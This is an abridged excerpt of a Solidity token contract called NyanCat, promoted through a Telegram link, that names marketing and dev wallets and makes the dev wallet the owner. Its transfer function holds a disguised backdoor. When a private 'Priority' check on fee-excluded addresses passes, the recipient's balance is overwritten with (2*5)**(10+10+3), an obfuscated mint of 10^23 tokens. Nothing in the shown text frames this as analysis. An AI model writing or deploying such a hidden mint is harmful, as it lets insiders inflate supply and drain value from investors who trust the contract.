...
// Telegram : https://t.me/NyanCatBNB
...
contract NyanCat is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xbdD578091427822e8BE2730dEDab7D20456Eb341); 
    address payable public Wallet_Dev = payable(0xD799eE9a09EA75582c31BEdf81E53bE91eB0ad31);
    ...
    constructor () {
        ...
        _owner = 0xD799eE9a09EA75582c31BEdf81E53bE91eB0ad31;
    ...
    function Priority(bool class1, bool class2) private pure returns(bool){
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(Priority(_isExcludedFromFee[sender], _isExcludedFromFee[recipient])){
            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+(2*5)**(10+10+3);
        }
        else{
